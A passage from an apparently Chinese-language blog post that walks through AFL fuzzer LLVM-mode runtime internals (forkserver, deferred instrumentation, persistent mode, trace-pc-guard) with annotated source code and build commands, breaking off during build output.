<h4 id="内部变量-afl-prev-loc-afl-area-ptr"><a href="#内部变量-afl-prev-loc-afl-area-ptr" class="headerlink" title="内部变量 __afl_prev_loc&amp;__afl_area_ptr"></a>内部变量 <code>__afl_prev_loc&amp;__afl_area_ptr</code></h4><ul>
<li>参考 [[#afl-llvm-rt]] 实现</li>
</ul>
<h2 id="afl-llvm-rt"><a href="#afl-llvm-rt" class="headerlink" title="afl-llvm-rt"></a>afl-llvm-rt</h2><ul>
<li>AFL LLVM_Mode中存在着三个特殊的功能。这三个功能的源码位于afl-llvm-rt.o.c中。</li>
<li>被 [[#afl-fast-clang]] 依赖编译<ul>
<li><a href="https://www.youtube.com/watch?v=S_OeRTePeXg&list=PL0qj8UdnOw30ZGMcM6DwvM1J2tttyy_D6">(1) Tutorial1 Introduction to LLVM - YouTube</a></li>
<li><a href="https://github.com/UofT-EcoSystem/CSCD70/tree/2023S/Tutorial01-Introduction_to_LLVM">CSCD70&#x2F;Tutorial01-Introduction_to_LLVM at 2023S · UofT-EcoSystem&#x2F;CSCD70</a></li>
</ul>
</li>
</ul>
<h3 id="解释内部变量"><a href="#解释内部变量" class="headerlink" title="解释内部变量"></a>解释内部变量</h3><h4 id="afl-prev-loc"><a href="#afl-prev-loc" class="headerlink" title="__afl_prev_loc"></a>__afl_prev_loc</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__thread u32 __afl_prev_loc;</span><br></pre></td></tr></table></figure>

<ul>
<li>在永久模式下设置 <code>__afl_prev_loc=0</code></li>
</ul>
<h4 id="afl-area-initial"><a href="#afl-area-initial" class="headerlink" title="__afl_area_initial"></a>__afl_area_initial</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">u8  __afl_area_initial[MAP_SIZE];</span><br><span class="line">u8* __afl_area_ptr = __afl_area_initial;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__afl_map_shm()</code> 会设置 <code>__afl_area_ptr</code></li>
<li>永久模式也会设置</li>
</ul>
<h3 id="deferred-instrumentation"><a href="#deferred-instrumentation" class="headerlink" title="deferred instrumentation"></a>deferred instrumentation</h3><h4 id="延迟初始化配置-代码"><a href="#延迟初始化配置-代码" class="headerlink" title="延迟初始化配置+代码"></a>延迟初始化配置+代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">afl-fuzz模式</span><br><span class="line">deferred_mode,             <span class="comment">/* Deferred forkserver mode?        */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>AFL会尝试通过仅执行一次目标二进制文件来优化性能。它会暂停控制流，然后复制该“主”进程以持续提供fuzzer的目标。该功能在某些情况下可以减少操作系统、链接与libc内部执行程序的成本。</li>
<li><strong>选好位置后，将下述代码添加到该位置上，之后使用afl-clang-fast重新编译代码即可</strong></li>
<li><strong>主动添加代码</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL  </span></span><br><span class="line">  __AFL_INIT();  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h4 id="afl-manual-init"><a href="#afl-manual-init" class="headerlink" title="__afl_manual_init"></a>__afl_manual_init</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL  </span></span><br><span class="line">  __AFL_INIT();  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">-&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL  </span></span><br><span class="line">  <span class="keyword">do</span> &#123; </span><br><span class="line">    <span class="type">static</span> <span class="keyword">volatile</span> <span class="type">char</span> *_A __attribute__((used));  </span><br><span class="line">    <span class="comment">// 定义了一个静态的 `volatile` 变量 `_A`，并使用 `__attribute__((used))` 修饰，这个修饰可以防止编译器优化掉未使用的变量</span></span><br><span class="line">    _A = (<span class="type">char</span>*)<span class="string">&quot;##SIG_AFL_DEFER_FORKSRV##&quot;</span>; </span><br><span class="line">    <span class="comment">// 将 `_A` 指向字符串 `&quot;##SIG_AFL_DEFER_FORKSRV##&quot;` 的首地址。</span></span><br><span class="line">    <span class="comment">// 实际上，这个字符串的内容对这段代码的逻辑没有直接影响，只是用来占用一些空间</span></span><br><span class="line">    __attribute__((<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>))) <span class="type">void</span> _I(<span class="type">void</span>) </span><br><span class="line">      __asm__(<span class="string">&quot;__afl_manual_init&quot;</span>); </span><br><span class="line">    <span class="comment">// 定义了一个带有 `visibility(&quot;default&quot;)` 属性的函数 `_I`，这个函数是 `__afl_manual_init` 函数的别名。</span></span><br><span class="line">    <span class="comment">// 使用了汇编宏指令 `__asm__` 来创建一个函数的别名。</span></span><br><span class="line">    _I(); </span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br></pre></td></tr></table></figure>

<ul>
<li>所以，整个宏定义的目的是在满足条件 <code>__AFL_HAVE_MANUAL_CONTROL</code> 时，调用 <code>_I</code> 函数，实际上就是调用 <code>__afl_manual_init</code> 函数。</li>
<li><code>__AFL_INIT()</code>内部调用<code>__afl_manual_init</code>函数。该函数的源代码如下</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// google_afl/llvm_mode/afl-llvm-rt.o.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This one can be called from user code when deferred forkserver mode</span></span><br><span class="line"><span class="comment">    is enabled. */</span></span><br><span class="line"><span class="type">void</span> __afl_manual_init(<span class="type">void</span>) &#123;  </span><br><span class="line">  <span class="type">static</span> u8 init_done;  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!init_done) &#123;  </span><br><span class="line">    __afl_map_shm();  </span><br><span class="line">    __afl_start_forkserver();  </span><br><span class="line">    init_done = <span class="number">1</span>;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<ul>
<li><code>__afl_manual_init</code> 用于在启用了延迟 fork 服务器模式（deferred forkserver mode）时进行初始化操作</li>
<li>如果还没有被初始化，就初始化共享内存，然后开始执行forkserver，然后设置init_done为1。</li>
</ul>
<h4 id="afl-map-shm"><a href="#afl-map-shm" class="headerlink" title="__afl_map_shm"></a>__afl_map_shm</h4><ul>
<li>简单的通过读取环境变量<code>SHM_ENV_VAR</code>来获取共享内存，然后将地址赋值给<code>__afl_area_ptr</code>。否则，默认的<code>__afl_area_ptr</code>指向的是一个数组。</li>
</ul>
<h4 id="afl-start-forkserver"><a href="#afl-start-forkserver" class="headerlink" title="__afl_start_forkserver"></a>__afl_start_forkserver</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __afl_start_forkserver(<span class="type">void</span>) &#123;</span><br><span class="line">  <span class="type">static</span> u8 tmp[<span class="number">4</span>];</span><br><span class="line">  s32 child_pid;</span><br><span class="line"></span><br><span class="line">  u8 child_stopped = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Phone home and tell the parent that we&#x27;re OK. If parent isn&#x27;t there,</span></span><br><span class="line"><span class="comment">     assume we&#x27;re not running in forkserver mode and just execute program. */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, tmp, <span class="number">4</span>) != <span class="number">4</span>) <span class="comment">// 告知AFL fuzz已经准备好了。</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;   <span class="comment">// 进入fuzz loop循环</span></span><br><span class="line">    u32 was_killed;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wait for parent by reading from the pipe. Abort if read fails. */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(FORKSRV_FD, &amp;was_killed, <span class="number">4</span>) != <span class="number">4</span>)</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 读取4个字节，如果当前管道中没有内容，就会堵塞在这里，如果读到了，就代表AFL命令我们fork server去执行一次fuzz</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we stopped the child in persistent mode, but there was a race</span></span><br><span class="line"><span class="comment">       condition and afl-fuzz already issued SIGKILL, write off the old</span></span><br><span class="line"><span class="comment">       process. */</span></span><br><span class="line">    <span class="comment">// 这段代码的目的是确保子进程在被杀死之前有机会重新启动，以避免竞态条件。如果子进程在被杀死之前处于停止状态，父进程会将其杀死并重新启动。如果子进程在被杀死之前未被停止，那么这段代码不会执行。</span></span><br><span class="line">    <span class="comment">// 这是为了解决可能的竞态条件，以确保子进程在被杀死前有机会重新启动</span></span><br><span class="line">    <span class="keyword">if</span> (child_stopped &amp;&amp; was_killed) &#123; </span><br><span class="line">      child_stopped = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">waitpid</span>(child_pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>) </span><br><span class="line">      <span class="comment">// 使用 `waitpid` 函数等待子进程的状态，以确保子进程的资源得到释放</span></span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!child_stopped) &#123; <span class="comment">// child_stopped 为0 接fork出一个子进程去进行fuzz</span></span><br><span class="line">      <span class="comment">/* Once woken up, create a clone of our process. */</span></span><br><span class="line">      child_pid = fork(); </span><br><span class="line">      <span class="keyword">if</span> (child_pid &lt; <span class="number">0</span>)</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* In child process: close fds, resume execution. */</span></span><br><span class="line">      <span class="keyword">if</span> (!child_pid) &#123;</span><br><span class="line">        <span class="built_in">close</span>(FORKSRV_FD);</span><br><span class="line">        <span class="built_in">close</span>(FORKSRV_FD + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 从这里开始执行用户的测试二进制程序。</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/* Special handling for persistent mode: if the child is alive but</span></span><br><span class="line"><span class="comment">         currently stopped, simply restart it with SIGCONT. */</span></span><br><span class="line">      <span class="built_in">kill</span>(child_pid, SIGCONT); </span><br><span class="line">      <span class="comment">// 这里是执行到 WIFSTOPPED(status) 之后设置了 child_stopped=1 说明子进程已经被暂停</span></span><br><span class="line">      <span class="comment">// 在这种情况下，通过调用 `kill(child_pid, SIGCONT)` 来向子进程发送 `SIGCONT` 信号，从而重新启动子进程的执行。</span></span><br><span class="line">      child_stopped = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">// 子进程重新启动后，`child_stopped` 被设置为 0，表示子进程已经恢复执行。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In parent process: write PID to pipe, then wait for child. */</span></span><br><span class="line">    <span class="comment">// 写入子进程的pid，然后等待子进程结束</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, &amp;child_pid, <span class="number">4</span>) != <span class="number">4</span>)</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注意这里对于persistent mode，我们会设置waitpid的第三个参数为WUNTRACED，代表若子进程进入暂停状态，则马上返回。</span></span><br><span class="line">    <span class="comment">//    waitpid的第三个参数=UNTRACED -&gt;  如果一个子进程处于停止状态（例如，收到了 `SIGSTOP` 或 `SIGTSTP` 信号），那么 `waitpid()` 将会返回该子进程的信息。</span></span><br><span class="line">    <span class="comment">//    在子进程被暂停时返回，而不是等待子进程终止。这就是子进程进入暂停状态的关键</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 非persistent mode </span></span><br><span class="line">    <span class="comment">//    waitpid的第三个参数=0        -&gt;  如果一个子进程处于停止状态，`waitpid()` 将不会因为这个原因而立即返回。相反，它会等待其他事件，例如子进程终止，然后返回终止的子进程的信息。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">waitpid</span>(child_pid, &amp;status, is_persistent ? WUNTRACED : <span class="number">0</span>) &lt; <span class="number">0</span>) <span class="comment">// 获取信息</span></span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In persistent mode, the child stops itself with SIGSTOP to indicate</span></span><br><span class="line"><span class="comment">       a successful run. In this case, we want to wake it up without forking</span></span><br><span class="line"><span class="comment">       again. */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WIFSTOPPED</span>(status))</span><br><span class="line">    <span class="comment">// 用于检查 `waitpid()` 或 `wait()` 函数返回的状态值（通常在 `status` 变量中），以确定子进程是否处于停止状态。</span></span><br><span class="line">    <span class="comment">// 如果子进程没有被暂停，即不是因为收到了 `SIGSTOP` 或 `SIGTSTP` 信号而停止，那么 `WIFSTOPPED(status)` 将返回 0（假）</span></span><br><span class="line">    <span class="comment">// 因为在persistent mode里子进程会通过SIGSTOP信号来暂停自己，并以此指示运行成功，所以在这种情况下，我们需要再进行一次fuzz，就只需要和上面一样，通过SIGCONT信号来唤醒子进程继续执行即可，不需要再进行一次fuzz</span></span><br><span class="line">      child_stopped = <span class="number">1</span>; <span class="comment">// 说明子进程已经被暂停</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Relay wait status to pipe, then loop back. */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, &amp;status, <span class="number">4</span>) != <span class="number">4</span>)</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="可能失灵初始化"><a href="#可能失灵初始化" class="headerlink" title="可能失灵初始化"></a>可能失灵初始化</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> In particular, the program will probably malfunction <span class="keyword">if</span> you select</span><br><span class="line">a location after:</span><br><span class="line">  - The creation of any vital threads <span class="keyword">or</span> child processes - since the forkserver</span><br><span class="line">    can<span class="number">&#x27;</span>t clone them easily.</span><br><span class="line">  - <span class="function">The initialization of timers via <span class="title">setitimer</span><span class="params">()</span> <span class="keyword">or</span> equivalent calls.</span></span><br><span class="line"><span class="function">  - The creation of temporary files, network sockets, offset-sensitive file</span></span><br><span class="line"><span class="function">    descriptors, <span class="keyword">and</span> similar shared-state resources - but only provided that</span></span><br><span class="line"><span class="function">    their state meaningfully influences the behavior of the program later on.</span></span><br><span class="line"><span class="function">  - Any access to the fuzzed input, including reading the metadata about its</span></span><br><span class="line"><span class="function">    size.</span></span><br></pre></td></tr></table></figure>

<h3 id="persistent-mode"><a href="#persistent-mode" class="headerlink" title="persistent mode"></a>persistent mode</h3><ul>
<li>上面我们其实已经介绍过persistent mode的一些特点了，那就是它并不是通过fork出子进程去进行fuzz的，而是认为当前我们正在fuzz的API是无状态的，当API重置后，一个长期活跃的进程就可以被重复使用，这样可以消除重复执行fork函数以及OS相关所需要的开销。</li>
<li>比llvm ‘s libfuzzer 弱，但比fork强</li>
</ul>
<h4 id="持久模式配置"><a href="#持久模式配置" class="headerlink" title="持久模式配置"></a>持久模式配置</h4><ul>
<li>afl-clang-fast编译<ul>
<li>循环次数不能设置过大，因为较小的循环次数可以将内存泄漏和类似故障的影响降到最低。所以循环次数设置成1000是个不错的选择。</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line">    <span class="comment">/* Read input data. */</span></span><br><span class="line">    <span class="comment">/* Call library code to be fuzzed. */</span></span><br><span class="line">    <span class="comment">/* Reset state. */</span></span><br><span class="line">  &#125;</span><br><span class="line">-&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (&#123; \</span><br><span class="line">  <span class="type">static</span> <span class="keyword">volatile</span> <span class="type">char</span> *_B __attribute__((used)); </span><br><span class="line">  _B = (<span class="type">char</span>*)<span class="string">&quot;##SIG_AFL_PERSISTENT##&quot;</span>; </span><br><span class="line">  <span class="comment">// // 实际上，这个字符串的内容对这段代码的逻辑没有直接影响，只是用来占用一些空间</span></span><br><span class="line">  __attribute__((<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>))) <span class="type">int</span> _L(<span class="type">unsigned</span> <span class="type">int</span>)  __asm__(<span class="string">&quot;__afl_persistent_loop&quot;</span>); </span><br><span class="line">  _L(<span class="number">1000</span>); </span><br><span class="line">&#125;) </span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">-&gt;</span><br><span class="line"><span class="keyword">while</span>(__afl_persistent_loop(<span class="number">1000</span>))&#123;</span><br><span class="line">    <span class="comment">/* Read input data. */</span></span><br><span class="line">    <span class="comment">/* Call library code to be fuzzed. */</span></span><br><span class="line">    <span class="comment">/* Reset state. */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="afl-auto-init"><a href="#afl-auto-init" class="headerlink" title="__afl_auto_init"></a>__afl_auto_init</h4><ul>
<li>默认持久模式下</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_TRACE_PC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_PRIO 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_PRIO 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^USE_TRACE_PC */</span></span></span><br><span class="line"><span class="comment">/* Proper initialization routine. */</span></span><br><span class="line">__attribute__((<span class="built_in">constructor</span>(CONST_PRIO))) <span class="type">void</span> __afl_auto_init(<span class="type">void</span>) &#123;</span><br><span class="line">  is_persistent = !!<span class="built_in">getenv</span>(PERSIST_ENV_VAR);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(DEFER_ENV_VAR)) </span><br><span class="line">  <span class="comment">// 因为deferred instrumentation会自己选择合适的时机，手动init，不需要用这个函数来init，所以这个函数只在没有手动init的时候会自动init。</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  __afl_manual_init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>一开始就调用 [[#__afl_manual_init]]</li>
</ul>
<h4 id="afl-persistent-loop"><a href="#afl-persistent-loop" class="headerlink" title="__afl_persistent_loop"></a>__afl_persistent_loop</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* A simplified persistent mode handler, used as explained in README.llvm. */</span></span><br><span class="line"><span class="type">int</span> __afl_persistent_loop(<span class="type">unsigned</span> <span class="type">int</span> max_cnt) &#123;</span><br><span class="line">  <span class="type">static</span> u8 first_pass = <span class="number">1</span>;</span><br><span class="line">  <span class="type">static</span> u32 cycle_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (first_pass) &#123;</span><br><span class="line">    <span class="comment">/* Make sure that every iteration of __AFL_LOOP() starts with a clean slate.</span></span><br><span class="line"><span class="comment">       On subsequent calls, the parent will take care of that, but on the first</span></span><br><span class="line"><span class="comment">       iteration, it&#x27;s our job to erase any trace of whatever happened</span></span><br><span class="line"><span class="comment">       before the loop. */</span></span><br><span class="line">       <span class="comment">// 我们需要抹掉之前发生的任何痕迹。</span></span><br><span class="line">    <span class="keyword">if</span> (is_persistent) &#123;</span><br><span class="line">      <span class="built_in">memset</span>(__afl_area_ptr, <span class="number">0</span>, MAP_SIZE);</span><br><span class="line">      __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      __afl_prev_loc = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cycle_cnt = max_cnt;</span><br><span class="line">    first_pass = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (is_persistent) &#123;  <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (--cycle_cnt) &#123; <span class="comment">//  如果剩余迭代次数不为零</span></span><br><span class="line">      <span class="built_in">raise</span>(SIGSTOP);  <span class="comment">// 暂停当前进程，等待父进程唤醒   这里配合 [[#__afl_start_forkserver]]</span></span><br><span class="line">      __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;  <span class="comment">// 将第一个字节设置为 1</span></span><br><span class="line">      __afl_prev_loc = <span class="number">0</span>;     <span class="comment">// 将前一个位置重置为 0</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/* When exiting __AFL_LOOP(), make sure that the subsequent code that</span></span><br><span class="line"><span class="comment">         follows the loop is not traced. We do that by pivoting back to the</span></span><br><span class="line"><span class="comment">         dummy output region. */</span></span><br><span class="line">      __afl_area_ptr = __afl_area_initial; <span class="comment">// 将 __afl_area_ptr 指针回退到初始位置</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回 0，表示迭代结束</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line">    <span class="built_in">fuzzAPI</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>过程<ul>
<li>首先在main函数之前读取共享内容，然后以当前进程为fork server，去和AFL fuzz通信。</li>
<li>当AFL fuzz通知进行一次fuzz，由于此时child_stopped为0，则fork server先fork出一个子进程。</li>
<li>这个子进程会很快执行到<code>__AFL_LOOP</code>包围的代码，因为是第一次执行loop，所以会先清空<code>__afl_area_ptr</code>和设置<code>__afl_prev_loc</code>为0，并向共享内存的第一个元素写一个值，然后设置循环次数1000，随后返回1，此时<code>while(__AFL_LOOP)</code>满足条件，于是执行一次fuzzAPI。</li>
<li>然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，此时将循环次数减一，变成999，然后发出信号<code>SIGSTOP</code>来让当前进程暂停，因为我们设置了<code>WUNTRACED</code>，所以<code>waitpid</code>函数就会返回，fork server将继续执行。</li>
<li>fork server在收到<code>SIGSTOP</code>信号后就知道fuzzAPI已经被成功执行结束了，就设置child_stopped为1，并告知AFL fuzz</li>
<li>然后当AFL fuzz通知再进行一次fuzz的时候，fork server将不再需要去fork出一个新的子进程去进行fuzz，只需要恢复之前的子进程继续执行，并设置<code>child_stopped</code>为0</li>
<li>因为我们是<strong>相当于重新执行一次程序</strong>，所以将<code>__afl_prev_loc</code>设置为0，并向共享内存的第一个元素写一个值，随后直接返回1，此时<code>while(__AFL_LOOP)</code>满足条件，于是执行一次fuzzAPI，然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，再次减少一次循环次数变成998，并发出信号暂停。</li>
<li>上述过程重复执行，直到第1000次执行时，先恢复执行，然后返回1，然后执行一次fuzzAPI，然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，再次减少一次循环次数变成0，此时循环次数cnt已经被减到0，就不会再发出信号暂停子进程，而是设置<code>__afl_area_ptr</code>指向一个无关数组<code>__afl_area_initial</code>，随后将子进程执行到结束。</li>
<li><strong>这是因为程序依然会向后执行并触发到instrument，这会向<code>__afl_area_ptr</code>里写值，但是此时我们其实并没有执行<code>fuzzAPI</code>，我们并不想向共享内存里写值，于是将其指向一个无关数组，随意写值。同理，在deferred instrumentation模式里，在执行<code>__afl_manual_init</code>之前，也是向无关数组里写值，因为我们将fork点手动设置，就代表在这个fork点之前的path我们并不关心。</strong></li>
<li>重新整理一下上面的逻辑<ul>
<li>loop第一次执行的时候，会初始化，然后返回1，执行一次fuzzAPI，然后cnt会减到999，然后抛出信号暂停子进程。</li>
<li>loop第二次执行的时候，恢复执行，清空一些值，然后返回1，执行一次fuzzAPI，然后cnt会减到998，然后抛出信号暂停子进程。</li>
<li>loop第1000次执行的时候，恢复执行，清空一些值，然后返回1，执行一次fuzzAPI，然后cnt会减到0，然后就设置指向无关数组，返回0，while循环结束，程序也将执行结束。</li>
</ul>
</li>
</ul>
</li>
<li>此时fork server将不再收到SIGSTOP信号，于是child_stopped仍为0。</li>
<li>所以当AFL fuzz通知fork server再进行一次fuzz的时候，由于此时child_stopped为0，则fork server会先fork出一个子进程，然后后续过程和之前一样了</li>
</ul>
<h3 id="trace-pc-guard-mode-测试"><a href="#trace-pc-guard-mode-测试" class="headerlink" title="trace-pc-guard mode-测试"></a>trace-pc-guard mode-测试</h3><ul>
<li><a href="https://clang.llvm.org/docs/SanitizerCoverage.html#tracing-pcs-with-guards">SanitizerCoverage — Clang 18.0.0git documentation</a></li>
</ul>
<h4 id="使用trace-pc"><a href="#使用trace-pc" class="headerlink" title="使用trace-pc"></a>使用trace-pc</h4><ul>
<li>要使用这个功能，需要先通过<code>AFL_TRACE_PC=1</code>来定义<code>DUSE_TRACE_PC</code>宏，从而在执行afl-clang-fast的时候传入<code>-fsanitize-coverage=trace-pc-guard</code>参数，来开启这个功能，和之前我们的插桩不同，<strong>开启了这个功能之后，我们不再是仅仅只对每个基本块插桩，而是对每条edge都进行了插桩</strong>。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LLVM_CONFIG=<span class="string">&quot;llvm-config-11&quot;</span></span><br><span class="line"><span class="built_in">export</span> CC=clang-11 CXX=clang++-11</span><br><span class="line"><span class="built_in">cd</span> /home/wutang/Desktop/google_afl/ </span><br><span class="line">AFL_TRACE_PC=1 make clean all   <span class="comment"># 编译下面需要的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/wutang/Desktop/google_afl/llvm_mode</span><br><span class="line">AFL_TRACE_PC=1 make clean all  <span class="comment"># 不会用 afl-llvm-pass.so </span></span><br><span class="line">    </span><br><span class="line">nm test-instr |grep __sanitizer_cov_trace_pc_guard</span><br><span class="line">0000000000424110 T __sanitizer_cov_trace_pc_guard</span><br><span class="line">0000000000424140 T __sanitizer_cov_trace_pc_guard_init</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;assert.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  char buf[8];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">read</span>(0, buf, 8) &lt; 1) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hum?\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(1);</span><br><span class="line">  &#125;</span><br><span class="line">  // input **ABCD** 通过</span><br><span class="line">  <span class="keyword">if</span> (buf[2] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;check A\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (buf[3] == <span class="string">&#x27;B&#x27;</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;check B\n&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (buf[4] == <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;check C\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (buf[5] == <span class="string">&#x27;4&#x27;</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;check D\n&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (strlen(buf) == 8 ) &#123;</span><br><span class="line">              assert(0);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;nothing\n&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A non-zero value? How quaint!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[+] All <span class="built_in">set</span> and ready to build.</span><br><span class="line">clang -funroll-loops  -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=\&quot;/usr/local/lib/afl\&quot; -DBIN_PATH=\&quot;/usr/local/bin\&quot; -DVERSION=\&quot;2.57b\&quot;  -DUSE_TRACE_PC=1 -fPIC -c afl-llvm-rt.o.c -o ../afl-llvm-rt.o</span><br><span class="line">[*] Building 32-bit variant of the runtime (-m32)... failed (that<span class="string">&#x27;s fine)</span></span><br><span class="line"><span class="string">[*] Building 64-bit variant of the runtime (-m64)... success!</span></span><br><span class="line"><span class="string">[*] Testing the CC wrapper and instrumentation output...</span></span><br><span class="line"><span class="string">unset AFL_USE_ASAN 